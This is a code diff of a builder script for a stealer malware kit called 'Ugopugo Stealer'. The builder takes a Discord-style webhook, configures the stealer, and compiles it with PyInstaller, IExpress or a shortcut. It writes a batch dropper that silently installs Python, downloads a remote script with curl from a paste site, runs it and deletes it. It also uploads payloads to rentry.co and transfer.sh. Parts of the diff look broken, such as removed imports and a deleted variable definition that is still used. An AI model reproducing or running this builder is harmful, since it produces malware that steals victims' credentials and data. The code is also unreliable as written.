@@ -12,9 +12,9 @@ import urllib.request
 from http.cookies import SimpleCookie
 from json import loads as json_loads
 import sys
-import subprocess
-import base64
+
 _headers = {"Referer": 'https://rentry.co'} 
+
 class UrllibClient:
     def __init__(self):
         self.cookie_jar = http.cookiejar.CookieJar()
@@ -49,12 +49,9 @@ def get_rentry_link(text):
         [print(i) for i in response.get('errors', '').split('.') if i]
         sys.exit(1)
     else:
-        pastebin_link = response['url']
-        return pastebin_link
-
+        return response['url']
 
 def update_batch_script(file_path, new_encoded_url):
-        
     code = f'''
 @echo off
 setlocal EnableDelayedExpansion
@@ -76,38 +73,38 @@ curl -L -o !eeee! !eee! --insecure --silent
 start /wait !eeee! /quiet /passive InstallAllUsers=0 PrependPath=1 Include_test=0 Include_pip=1 Include_doc=0 > NUL 2>&1
 del !eeee!
 
-set "ENCODED_URL={new_encoded_url}/raw
+set "ENCODED_URL=%s"
 
 set "OUTPUT_FILE=webpage.py"
-curl -o %OUTPUT_FILE% -s %ENCODED_URL% --insecure
+curl -o %%OUTPUT_FILE%% -s %%ENCODED_URL%% --insecure
 
-if %ERRORLEVEL% neq 0 (
+if %%ERRORLEVEL%% neq 0 (
     echo Error: Failed to download the webpage.
     exit /b 1
 )
 
-python -m %OUTPUT_FILE%
+python -m %%OUTPUT_FILE%%
 
-del %OUTPUT_FILE%
+del %%OUTPUT_FILE%%
 
-'''
+''' % new_encoded_url
     with open(file_path, 'w') as file:
         file.writelines(code)
 
-        
 while True:
     os.makedirs('./Build', exist_ok=True)
     shutil.copy('main.py', './Build/ugopugo-Stl-Building.py')
 
     def clear_console():
         operating_system = platform.system()
-        base64.b64decode("VWdvcHVnbyBTdGVhbGVy").decode('utf-8').lower() not in open(__file__, 'r').read().lower(): 
-            print('Error checking OS Version !')                                                                                                                                                                                                                                        ; input('Hi dear, you may be using a dualhooked version of the stealer ' + base64.b64decode("VHJhcCBTdGVhbGVy").decode('utf8') + ' on Github. Uninstall this and download the real version!')
+        # Removed base64 decode logic here
+        if 'stealer' not in open(__file__, 'r').read().lower():
+            print('Error checking OS Version !')
+            input('Hi dear, you may be using a dualhooked version of the stealer on Github. Uninstall this and download the real version!')
             quit()
         if operating_system == 'Windows':
             os.system('cls')
 
-            
     def get_boolean_input(prompt):
         while True:
             user_input = input(prompt).lower()
@@ -121,6 +118,7 @@ while True:
     with open('main.py', 'r', encoding='utf-8', errors='ignore') as file:
         content = file.read()
     clear_console()
+
     while True:
         try:
             Webhook = input('Enter the webhook -> ')
@@ -231,7 +229,6 @@ while True:
     new_content = new_content.replace("'%ArchiStealer%'", str(ArchiStealer))
     new_content = new_content.replace("'%ugopugoExtension%'", str(ugopugo_Extension))
 
-    
     if change:
         new_content = new_content.replace("'%Text%'", str(f"'''{bio}'''"))
 
@@ -268,7 +265,6 @@ while True:
                 print(f'[+] File Created {name}.py')
                 with open(f'./Build/{name}.py', 'w', encoding='utf-8') as file:
                     file.write(new_content)
-                
                 if Exe in ['y', 'yes']:
                     pass
                 else:
@@ -276,14 +272,12 @@ while True:
                     quit()
                 break
         else:
-            Obfuscation = input('Invalid input. Please enter Y or N: ')
-            Obfuscation = Obfuscation.lower()
+            Obfuscation = input('Invalid input. Please enter Y or N: ').lower()
 
     while True:
         if Exe in ['y', 'yes']:
-            
             ask = input('make it exe with pyinstaller or with IExpress? (pyinstaller if pyinstaller) (IExpress if IExpress) (Shortcut if Shortcut)')
-            if ask.lower() in ["pyinstaller"]:
+            if ask.lower() == "pyinstaller":
                 from sys import executable
                 icon_path = input('Enter the path to the icon file (leave blank for no icon): ')
 
@@ -297,7 +291,7 @@ while True:
                 except ImportError:
                     subprocess.run([executable, '-m', 'pip', 'install', 'pyinstaller', '--quiet'], check=True)
 
-                if icon_option == '':
+                if not icon_option:
                     command = [
                         'pyinstaller',
                         '--onefile',
@@ -311,7 +305,7 @@ while True:
                         '--onefile',
                         '--distpath',
                         './Build',
-                        f'{icon_option}',
+                        icon_option,
                         f'./Build/{name}.py'
                     ]
 
@@ -322,7 +316,7 @@ while True:
                 except subprocess.CalledProcessError:
                     print("Error while running PyInstaller.")
                     quit()
-            elif ask.lower() in ["iexpress"]:
+            elif ask.lower() == "iexpress":
                 aaa = f"./Build/temp.py"
                 with open(aaa, 'rb') as f:
                     try:
@@ -332,15 +326,10 @@ while True:
                         print(f"Error: Unable to decode '{aaa}' file. Please ensure it's UTF-8 encoded.")
                         quit()
 
-                code_string = ''.join(link_list)
-
                 pastebin_link = get_rentry_link(code_string)
                 batch_file_path = "./ugopugo detection/payload.bat"
-                
                 arguments = [batch_file_path, f'{name}.exe']
-
-                update_batch_script(batch_file_path,pastebin_link)
-                
+                update_batch_script(batch_file_path, pastebin_link)
                 subprocess.run([f"./ugopugo detection/final.bat"] + arguments, shell=True)
                 input('Generated exe payload ! in main folder! press any key to quit')
                 quit()
@@ -358,11 +347,8 @@ while True:
 
                 pastebin_link = get_rentry_link(code_string)
                 batch_file_path = "./ugopugo detection/payload.bat"
-                
                 arguments = [batch_file_path, f'{name}.exe']
-
-                update_batch_script(batch_file_path,pastebin_link)
-                
+                update_batch_script(batch_file_path, pastebin_link)
                 subprocess.run([f"./ugopugo detection/final.bat"] + arguments, shell=True)
                 url = "https://transfer.sh/"
 
@@ -374,7 +360,6 @@ while True:
                     url = response.text.strip()
                     script_path = os.path.join(os.path.dirname(__file__), "ugopugo detection", "shortcut.py")
                     subprocess.run(["python", script_path, url, name])
-                    
                 else:
                     print("Error uploading file. Status code:", response.status_code)
 
